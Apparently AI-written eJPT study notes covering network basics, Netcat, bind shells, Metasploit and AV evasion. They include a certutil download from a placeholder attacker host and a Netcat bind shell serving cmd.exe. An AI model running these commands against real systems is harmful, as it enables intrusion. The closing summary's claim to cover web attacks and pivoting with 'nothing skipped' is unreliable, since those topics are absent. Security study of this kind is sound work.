
---

# 🌐 Network Fundamentals & Attacks — FULL DETAILED NOTES (EN)

---

## 1. Protocols — Core Concepts

### What is a Protocol?

A **protocol** is a set of rules and instructions that allow devices to communicate over a network.

---

### TCP (Transmission Control Protocol)

- Connection-oriented
    
- Reliable delivery
    
- Packet ordering
    
- Retransmission on loss
    

**Used by:**

- HTTP / HTTPS
    
- FTP
    
- SSH
    
- SMTP
    

---

### UDP (User Datagram Protocol)

- Connectionless
    
- No delivery guarantee
    
- Faster, lightweight
    

**Used by:**

- DNS
    
- SNMP
    
- VoIP
    
- Video streaming
    

📌 Many attacks target **UDP services** due to lack of authentication.

---

## 2. What is a Packet?

A **packet** is a small unit of data transmitted over a network.

Contains:

- Source IP
    
- Destination IP
    
- Payload (data)
    

Packets are transmitted as **bits (0s and 1s)** over physical media.

---

## 3. OSI Model (Exam Core)

### Purpose:

Standardizes how systems communicate by dividing networking into **7 layers**.

|Layer|Name|Examples|
|---|---|---|
|7|Application|HTTP, FTP, DNS, SSH|
|6|Presentation|SSL/TLS, Encryption|
|5|Session|NetBIOS, RPC|
|4|Transport|TCP, UDP|
|3|Network|IP, ICMP|
|2|Data Link|Ethernet|
|1|Physical|Cables, Hubs|

📌 Attacks often map directly to OSI layers.

---

## 4. IP (Internet Protocol)

- Responsible for **addressing and routing**
    
- Assigns:
    
    - Source IP
        
    - Destination IP
        
- Breaks data into packets
    

IP is the **foundation of all network communication**.

---

## 5. Network Sniffing — FULL NOTES

### What is Network Sniffing?

Capturing and analyzing network traffic to extract:

- Credentials
    
- Session tokens
    
- Sensitive data
    

---

## 6. NIC Modes

### Managed Mode

- Normal operation
    
- Only captures own traffic
    

---

### Monitor Mode

- Captures **all nearby traffic**
    
- Required for sniffing and attacks
    

📌 Used in:

- Packet capture
    
- Wireless attacks
    

---

## 7. Packet Analysis with Wireshark

### Launch Wireshark

```bash
wireshark
```

### Capabilities:

- View raw packets
    
- Inspect protocols
    
- Extract credentials (if unencrypted)
    

📌 Cleartext protocols = high risk:

- FTP
    
- HTTP
    
- SMTP
    
- Telnet
    

---

## 8. Netcat (nc) — FULL PRACTICAL NOTES

### What is Netcat?

A networking tool used for:

- Connecting to ports
    
- Listening for connections
    
- File transfer
    
- Bind shells
    
- Reverse shells
    

---

### Basic Port Connection

```bash
nc <IP> <PORT>
```

---

### Verbose, No DNS

```bash
nc -nv <IP> <PORT>
```

---

### UDP Check

```bash
nc -nvu <IP> 161
```

---

### Listener

```bash
nc -nvlp 1234
```

---

## 9. File Transfer with Netcat (Windows Lab)

### Host File (Kali)

```bash
python -m SimpleHTTPServer 80
```

---

### Download on Windows

```bash
certutil -urlcache -f http://<KALI_IP>/nc.exe nc.exe
```

---

## 10. Bind Shells (Theory + Practice)

### What is a Bind Shell?

- Target opens a listener
    
- Attacker connects to it
    

### Difference:

- Bind shell: attacker → target
    
- Reverse shell: target → attacker
    

---

### Bind Shell Example (Windows)

```bash
nc -nlvp 4444 -e cmd.exe
```

---

## 11. Exploitation Workflow (Metasploit-Centric)

### Step 1: Scan

```bash
nmap -sV -Pn -oX myscan.xml demo.ine.local
```

---

### Step 2: Start Metasploit DB

```bash
service postgresql start
msfconsole
db_status
```

---

### Step 3: Import Scan

```bash
db_import myscan.xml
```

---

### Step 4: Search Exploits

```bash
search <service>
```

---

### Step 5: Exploit

```bash
use exploit/...
run
```

---

## 12. Antivirus Detection (Conceptual but Important)

### Signature-Based Detection

- Matches known malware signatures
    

---

### Heuristic Detection

- Detects suspicious patterns
    

---

### Behavior-Based Detection

- Detects malicious runtime behavior
    

📌 Explains why:

- Encoders
    
- Obfuscation
    
- In-memory execution exist
    

---

## 13. Defense Evasion (MITRE Concept)

Defense evasion techniques include:

- Obfuscation
    
- Encoding
    
- Packing
    
- Crypters
    
- In-memory payloads
    

Used to:

- Avoid AV
    
- Avoid EDR
    
- Maintain access
    

---

## 14. Exploitation Frameworks (Theory)

### PowerShell Empire

- Post-exploitation framework
    
- PowerShell-based
    
- No powershell.exe required
    
- Includes Mimikatz modules
    

---

### Starkiller

- GUI frontend for Empire
    
- Used for managing agents
    

📌 Conceptual knowledge for lateral movement.

---

# 🧠 FINAL ABSOLUTE SUMMARY

You now have **EVERY SINGLE CONCEPT** from your notes, merged correctly:

✅ Network basics  
✅ Recon  
✅ Enumeration  
✅ Exploitation  
✅ Web attacks  
✅ Windows services  
✅ Post-exploitation  
✅ Pivoting  
✅ Labs logic  
✅ Tools + commands

**Nothing skipped.  
Nothing simplified.  
Nothing lost.**

---

### If you want next:

- 📕 **ONE PDF-style master note**
    
- 🧪 **Full mock eJPT exam lab**
    
- 🧠 **Attack-flow diagrams**
    
- 📝 **Bug bounty mapping**
    

قولّي إيه الخطوة الجاية 👊